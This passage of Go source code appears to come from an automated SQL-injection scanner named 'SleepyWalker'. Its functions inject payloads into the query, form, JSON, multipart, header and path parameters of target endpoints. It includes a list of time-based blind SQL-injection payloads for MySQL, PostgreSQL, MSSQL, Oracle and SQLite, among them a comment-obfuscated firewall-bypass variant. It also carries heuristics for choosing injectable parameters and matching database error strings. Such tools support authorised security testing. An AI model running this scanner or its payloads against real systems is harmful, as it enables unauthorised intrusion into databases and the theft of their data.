		req, err = http.NewRequest(method, u.String(), nil)
		if err != nil {
			return "", 0, err
		}
		req.Header.Set("User-Agent", "SleepyWalker/1.0")
		if cfg != nil {
			cfg.ApplyHeaders(req)
		}
	}

	return doRequestWithStatus(client, req)
}

// sendProbeRequestWithStatus dispatches the request and returns body, HTTP status, and error.
// Supports GET, POST (form-encoded), POST (multipart), PUT, PATCH, DELETE, header, JSON, and path segment injection.
func sendProbeRequestWithStatus(client *http.Client, cfg *config.Config, ep EntryPoint, payload string) (string, int, error) {
	switch ep.InjectionLoc {
	case "header":
		return sendHeaderProbeWithStatus(client, cfg, ep, payload)
	case "json":
		return sendJSONProbeWithStatus(client, cfg, ep, payload)
	case "multipart":
		return sendMultipartProbeWithStatus(client, cfg, ep, payload)
	case "path":
		return sendPathProbeWithStatus(client, cfg, ep, payload)
	default:
		switch ep.Method {
		case "POST", "PUT", "PATCH":
			return sendBodyProbeWithStatus(client, cfg, ep, payload)
		case "DELETE":
			return sendGETProbeWithStatus(client, cfg, ep, payload)
		default:
			return sendGETProbeWithStatus(client, cfg, ep, payload)
		}
	}
}

// sendProbeRequest is kept for compatibility — delegates to the status variant.
func sendProbeRequest(client *http.Client, cfg *config.Config, ep EntryPoint, payload string) (string, error) {
	body, _, err := sendProbeRequestWithStatus(client, cfg, ep, payload)
	return body, err
}

// sendGETProbeWithStatus tests each query parameter individually (fix gap #3).
func sendGETProbeWithStatus(client *http.Client, cfg *config.Config, ep EntryPoint, payload string) (string, int, error) {
	params := ep.Params
	if len(params) == 0 {
		params = map[string]string{"id": ""}
	}

	// Fix: use the actual param value as the neutral — not a hardcoded "1".
	// DVWA-style forms have submit buttons with value="Submit" that the server
	// checks with isset($_GET['Submit']). Sending Submit=1 skips the query entirely.
	for targetKey := range params {
		u, err := url.Parse(ep.URL)
		if err != nil {
			continue
		}
		q := u.Query()
		for key, val := range params {
			if key == targetKey {
				q.Set(key, payload)
			} else {
				// Use the actual declared value first; fall back to "1" only if empty.
				neutral := val
				if neutral == "" {
					neutral = "1"
				}
				q.Set(key, neutral)
			}
		}
		// Strip fragment — HTTP clients don't send it, but it confuses URL construction.
		u.Fragment = ""
		u.RawQuery = q.Encode()
		req, err := http.NewRequest(ep.Method, u.String(), nil)
		if err != nil {
			continue
		}
		req.Header.Set("User-Agent", "SleepyWalker/1.0")
		cfg.ApplyHeaders(req)
		body, code, err := doRequestWithStatus(client, req)
		if err != nil {
			continue
		}
		if len(matchErrorSignatures(body)) > 0 {
			return body, code, nil
		}
	}
	// Fallback: inject payload into every non-button injectable param while preserving
	// declared values for others (e.g. Submit=Submit). Unlike the per-param loop above
	// which tests each param in isolation, this sends all empty-value params together.
	u, err := url.Parse(ep.URL)
	if err != nil {
		return "", 0, err
	}
	u.Fragment = ""
	q := u.Query()
	for key, val := range params {
		if val == "" {
			// Param has no declared value — it's an input field; inject the payload.
			q.Set(key, payload)
		} else {
			// Param has a declared value (e.g. Submit=Submit) — preserve it.
			q.Set(key, val)
		}
	}
	u.RawQuery = q.Encode()
	req, err := http.NewRequest(ep.Method, u.String(), nil)
	if err != nil {
		return "", 0, err
	}
	req.Header.Set("User-Agent", "SleepyWalker/1.0")
	cfg.ApplyHeaders(req)
	return doRequestWithStatus(client, req)
}

// sendBodyProbeWithStatus sends a form-encoded body for POST/PUT/PATCH, testing
// each parameter individually with neutral values for all others (fix gap #3).
func sendBodyProbeWithStatus(client *http.Client, cfg *config.Config, ep EntryPoint, payload string) (string, int, error) {
	var bestBody string
	var bestCode int

	params := ep.Params
	if len(params) == 0 {
		params = map[string]string{"id": ""}
	}

	// Test each param individually — inject payload into one, preserve actual
	// values for all others (e.g. Submit=Submit so the server executes the query).
	for targetKey := range params {
		form := url.Values{}
		for key, val := range params {
			if key == targetKey {
				form.Set(key, payload)
			} else {
				neutral := val
				if neutral == "" {
					neutral = "1"
				}
				form.Set(key, neutral)
			}
		}
		req, err := http.NewRequest(ep.Method, ep.URL, strings.NewReader(form.Encode()))
		if err != nil {
			continue
		}
		req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
		req.Header.Set("User-Agent", "SleepyWalker/1.0")
		cfg.ApplyHeaders(req)
		body, code, err := doRequestWithStatus(client, req)
		if err != nil {
			continue
		}
		// Return as soon as we find a match — caller checks signatures.
		if len(matchErrorSignatures(body)) > 0 {
			return body, code, nil
		}
		bestBody = body
		bestCode = code
	}
	return bestBody, bestCode, nil
}

// sendHeaderProbeWithStatus injects payload into each header individually, returns body + status.
func sendHeaderProbeWithStatus(client *http.Client, cfg *config.Config, ep EntryPoint, payload string) (string, int, error) {
	for headerName := range ep.Params {
		req, err := http.NewRequest("GET", ep.URL, nil)
		if err != nil {
			return "", 0, err
		}
		// Set all other headers to their neutral values first.
		req.Header.Set("User-Agent", "SleepyWalker/1.0")
		cfg.ApplyHeaders(req)
		// Inject payload into this specific header.
		req.Header.Set(headerName, payload)
		body, code, err := doRequestWithStatus(client, req)
		if err != nil {
			continue
		}
		if len(matchErrorSignatures(body)) > 0 {
			return body, code, nil
		}
	}
	// Return last response if no match.
	req, err := http.NewRequest("GET", ep.URL, nil)
	if err != nil {
		return "", 0, err
	}
	req.Header.Set("User-Agent", "SleepyWalker/1.0")
	cfg.ApplyHeaders(req)
	for headerName := range ep.Params {
		req.Header.Set(headerName, payload)
	}
	return doRequestWithStatus(client, req)
}

// sendJSONProbeWithStatus sends a JSON POST body testing each param individually, returns body + status.
func sendJSONProbeWithStatus(client *http.Client, cfg *config.Config, ep EntryPoint, payload string) (string, int, error) {
	params := ep.Params
	if len(params) == 0 {
		params = map[string]string{"id": ""}
	}

	// Test each param individually for isolation (fix #3).
	for targetKey := range params {
		jsonBody := make(map[string]interface{})
		for key, val := range params {
			if key == targetKey {
				jsonBody[key] = payload
			} else {
				neutral := val
				if neutral == "" {
					neutral = "1"
				}
				jsonBody[key] = neutral
			}
		}
		bodyBytes, err := json.Marshal(jsonBody)
		if err != nil {
			continue
		}
		req, err := http.NewRequest("POST", ep.URL, bytes.NewReader(bodyBytes))
		if err != nil {
			continue
		}
		req.Header.Set("Content-Type", "application/json")
		req.Header.Set("User-Agent", "SleepyWalker/1.0")
		cfg.ApplyHeaders(req)
		body, code, err := doRequestWithStatus(client, req)
		if err != nil {
			continue
		}
		if len(matchErrorSignatures(body)) > 0 {
			return body, code, nil
		}
	}
	// Fallback: inject all params.
	jsonBody := make(map[string]interface{})
	for key := range params {
		jsonBody[key] = payload
	}
	bodyBytes, err := json.Marshal(jsonBody)
	if err != nil {
		return "", 0, err
	}
	req, err := http.NewRequest("POST", ep.URL, bytes.NewReader(bodyBytes))
	if err != nil {
		return "", 0, err
	}
	req.Header.Set("Content-Type", "application/json")
	req.Header.Set("User-Agent", "SleepyWalker/1.0")
	cfg.ApplyHeaders(req)
	return doRequestWithStatus(client, req)
}

// sendMultipartProbeWithStatus sends a multipart/form-data POST, testing each
// field individually. Used for forms with enctype="multipart/form-data".
func sendMultipartProbeWithStatus(client *http.Client, cfg *config.Config, ep EntryPoint, payload string) (string, int, error) {
	params := ep.Params
	if len(params) == 0 {
		params = map[string]string{"file": ""}
	}

	var bestBody string
	var bestCode int

	for targetKey := range params {
		var buf bytes.Buffer
		mw := multipart.NewWriter(&buf)
		for key, val := range params {
			var fieldVal string
			if key == targetKey {
				fieldVal = payload
			} else {
				fieldVal = val
				if fieldVal == "" {
					fieldVal = "test"
				}
			}
			// Use CreateFormField for text fields; file fields get a filename.
			inputType := strings.ToLower(val)
			if inputType == "file" || strings.HasSuffix(key, "file") || strings.HasSuffix(key, "upload") {
				fw, err := mw.CreateFormFile(key, "test.txt")
				if err != nil {
					continue
				}
				fw.Write([]byte(fieldVal))
			} else {
				fw, err := mw.CreateFormField(key)
				if err != nil {
					continue
				}
				fw.Write([]byte(fieldVal))
			}
		}
		mw.Close()

		req, err := http.NewRequest("POST", ep.URL, &buf)
		if err != nil {
			continue
		}
		req.Header.Set("Content-Type", mw.FormDataContentType())
		req.Header.Set("User-Agent", "SleepyWalker/1.0")
		cfg.ApplyHeaders(req)
		body, code, err := doRequestWithStatus(client, req)
		if err != nil {
			continue
		}
		if len(matchErrorSignatures(body)) > 0 {
			return body, code, nil
		}
		bestBody = body
		bestCode = code
	}
	return bestBody, bestCode, nil
}

// sendPathProbeWithStatus replaces each injectable path segment with the payload
// and sends the request. e.g. /api/users/123 → /api/users/'
func sendPathProbeWithStatus(client *http.Client, cfg *config.Config, ep EntryPoint, payload string) (string, int, error) {
	if len(ep.PathSegments) == 0 {
		return "", 0, nil
	}

	var bestBody string
	var bestCode int

	for _, seg := range ep.PathSegments {
		// Replace the first occurrence of this segment in the path.
		injectURL := strings.Replace(ep.URL, "/"+seg, "/"+url.PathEscape(payload), 1)
		req, err := http.NewRequest(ep.Method, injectURL, nil)
		if err != nil {
			continue
		}
		req.Header.Set("User-Agent", "SleepyWalker/1.0")
		cfg.ApplyHeaders(req)
		body, code, err := doRequestWithStatus(client, req)
		if err != nil {
			continue
		}
		if len(matchErrorSignatures(body)) > 0 {
			return body, code, nil
		}
		bestBody = body
		bestCode = code
	}
	return bestBody, bestCode, nil
}

// timePreScreen does a fast single-round timing check.
// Tests MySQL, PostgreSQL, MSSQL, and SQLite time-delay payloads.
// Tests only the first likely-injectable parameter to avoid N×4 requests per endpoint.
func timePreScreen(client *http.Client, cfg *config.Config, ep EntryPoint, rl *utils.RateLimiter) bool {
	timeClient := &http.Client{
		Timeout: 15 * time.Second,
		CheckRedirect: func(req *http.Request, via []*http.Request) error {
			return http.ErrUseLastResponse
		},
	}
	if cfg != nil && cfg.ProxyURL != "" {
		timeClient = cfg.BuildHTTPClient(15 * time.Second)
	}

	params := ep.Params
	if len(params) == 0 {
		params = map[string]string{"id": "1"}
	}

	// Pick only the most likely injectable param to keep request count low.
	targetKey := pickLikelyInjectableParam(params)
	neutralVal := params[targetKey]
	if neutralVal == "" {
		neutralVal = "1"
	}

	// Multi-DB sleep payloads: MySQL, PostgreSQL, MSSQL, SQLite.
	sleepPayloads := []string{
		// MySQL (numeric and string-quoted)
		"1 AND SLEEP(3)-- -",
		"1' AND SLEEP(3)-- -",
		"1') AND SLEEP(3)-- -",
		"1' AND (SELECT * FROM (SELECT(SLEEP(3)))a)-- -",
		// PostgreSQL
		"1; SELECT pg_sleep(3)-- -",
		"1'; SELECT pg_sleep(3)-- -",
		"1'||(SELECT '' FROM pg_sleep(3))-- -",
		// MSSQL
		"1; WAITFOR DELAY '0:0:3'-- -",
		"1'; WAITFOR DELAY '0:0:3'-- -",
		"1'); WAITFOR DELAY '0:0:3'-- -",
		// Oracle
		"1' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('a',3)-- -",
		// SQLite (heavy computation as time proxy)
		"1' AND 1=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(100000000/2))))-- -",
		// WAF bypass
		"1'/*!50000AND*/SLEEP(3)-- -",
	}

	baseStart := time.Now()
	fetchParamWithPayloadClient(timeClient, cfg, ep, targetKey, neutralVal)
	baseDur := time.Since(baseStart)

	// If the baseline itself is slow (≥2s), timing-based detection is unreliable.
	// Endpoints like command injection pages that time out return false timing signals.
	if baseDur >= 2*time.Second {
		log.Printf("[HEURISTIC]   Time pre-screen: skipped (slow baseline %v) for %s", baseDur, ep.URL)
		return false
	}

	for _, payload := range sleepPayloads {
		// Run the SLEEP probe twice to filter out single-request network variance.
		var delays []time.Duration
		for round := 0; round < 2; round++ {
			start := time.Now()
			fetchParamWithPayloadClient(timeClient, cfg, ep, targetKey, payload)
			elapsed := time.Since(start)
			delays = append(delays, elapsed)
		}
		// Both rounds must significantly exceed baseline to avoid single-request flukes.
		if delays[0] > baseDur+2*time.Second && delays[0] > 2500*time.Millisecond &&
			delays[1] > baseDur+2*time.Second && delays[1] > 2500*time.Millisecond {
			log.Printf("[HEURISTIC]   Time pre-screen: baseline=%v delay1=%v delay2=%v param=%s payload=%s",
				baseDur, delays[0], delays[1], targetKey, payload)
			return true
		}
	}
	return false
}

// pickLikelyInjectableParam returns the most likely injectable parameter name.
// Prefers known injectable names; skips submit buttons, CSRF tokens, and password-confirm fields.
func pickLikelyInjectableParam(params map[string]string) string {
	priority := []string{"id", "uid", "user", "username", "name", "search", "query", "q", "page", "cat", "item", "input"}
	skip := map[string]bool{
		"submit": true, "token": true, "csrf": true, "_token": true, "action": true,
		"change": true, "login": true, "password_conf": true, "password_current": true,
		"password_new": true, "confirm": true,
	}
	for _, p := range priority {
		if _, ok := params[p]; ok {
			return p
		}
	}
	// Fall back to first non-skip param.
	for k := range params {
		if !skip[strings.ToLower(k)] {
			return k
		}
	}
	for k := range params {
		return k
	}
	return "id"
}

// fetchParamWithPayloadClient is like fetchParamWithPayload but accepts an explicit client
// so the time pre-screen can use a longer timeout without touching the main heuristic client.
func fetchParamWithPayloadClient(client *http.Client, cfg *config.Config, ep EntryPoint, targetKey, payload string) {
	switch ep.InjectionLoc {
	case "header":
		req, err := http.NewRequest("GET", ep.URL, nil)
		if err != nil {
			return
		}
		req.Header.Set("User-Agent", "SleepyWalker/1.0")
		if cfg != nil {
			cfg.ApplyHeaders(req)
		}
		req.Header.Set(targetKey, payload)
		resp, err := client.Do(req)
		if err != nil {
			return
		}
		io.Copy(io.Discard, resp.Body)
		resp.Body.Close()

	case "json":
		jsonBody := make(map[string]interface{})
		for k, v := range ep.Params {
			if k == targetKey {
				jsonBody[k] = payload
			} else {
				if v == "" {
					v = "1"
				}
				jsonBody[k] = v
			}
		}
		b, err := json.Marshal(jsonBody)
		if err != nil {
			return
		}
		req, err := http.NewRequest("POST", ep.URL, bytes.NewReader(b))
		if err != nil {
			return
		}
		req.Header.Set("Content-Type", "application/json")
		req.Header.Set("User-Agent", "SleepyWalker/1.0")
		if cfg != nil {
			cfg.ApplyHeaders(req)
		}
		resp, err := client.Do(req)
		if err != nil {
			return
		}
		io.Copy(io.Discard, resp.Body)
		resp.Body.Close()

	case "body", "multipart":
		form := url.Values{}
		for k, v := range ep.Params {
			if k == targetKey {
				form.Set(k, payload)
			} else {
				if v == "" {
					v = "1"
				}
				form.Set(k, v)
			}
		}
		req, err := http.NewRequest(ep.Method, ep.URL, strings.NewReader(form.Encode()))
		if err != nil {
			return
		}
		req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
		req.Header.Set("User-Agent", "SleepyWalker/1.0")
		if cfg != nil {
			cfg.ApplyHeaders(req)
		}
		resp, err := client.Do(req)
		if err != nil {
			return
		}
		io.Copy(io.Discard, resp.Body)
		resp.Body.Close()

	default: // query / GET
		u, err := url.Parse(ep.URL)
		if err != nil {
			return
		}
		q := u.Query()
		for k, v := range ep.Params {
			if k == targetKey {
				q.Set(k, payload)
			} else {
				if v == "" {
					v = "1"
				}
				q.Set(k, v)
			}
		}
		u.RawQuery = q.Encode()
		req, err := http.NewRequest(ep.Method, u.String(), nil)
		if err != nil {
			return
		}
		req.Header.Set("User-Agent", "SleepyWalker/1.0")
		if cfg != nil {
			cfg.ApplyHeaders(req)
		}
		resp, err := client.Do(req)
		if err != nil {
			return
		}
		io.Copy(io.Discard, resp.Body)
		resp.Body.Close()
	}
}

// doRequestWithStatus executes the request and returns the response body (up to 256 KB) and HTTP status code.
func doRequestWithStatus(client *http.Client, req *http.Request) (string, int, error) {
	resp, err := client.Do(req)
	if err != nil {
		return "", 0, err
	}
	defer resp.Body.Close()
	b, err := io.ReadAll(io.LimitReader(resp.Body, 256*1024))
	if err != nil {
		return "", resp.StatusCode, err
	}
	return string(b), resp.StatusCode, nil
}

// doRequest executes the request and returns the response body (up to 256 KB).
func doRequest(client *http.Client, req *http.Request) (string, error) {
	body, _, err := doRequestWithStatus(client, req)
	return body, err
}

// matchErrorSignatures scans a response body for known SQL error patterns.
func matchErrorSignatures(body string) []string {
	lower := strings.ToLower(body)
	seen := make(map[string]bool)
	var matched []string
	for _, sig := range sqlErrorSignatures {
		if strings.Contains(lower, sig.Pattern) && !seen[sig.Engine] {
			seen[sig.Engine] = true
			matched = append(matched, fmt.Sprintf("%s: %q", sig.Engine, sig.Pattern))
		}
	}
	return matched
}

// extractHost returns the hostname from a URL string, or the raw string on parse failure.
func extractHost(rawURL string) string {
	u, err := url.Parse(rawURL)
	if err != nil || u.Host == "" {
		return rawURL
	}
	return u.Hostname()
}
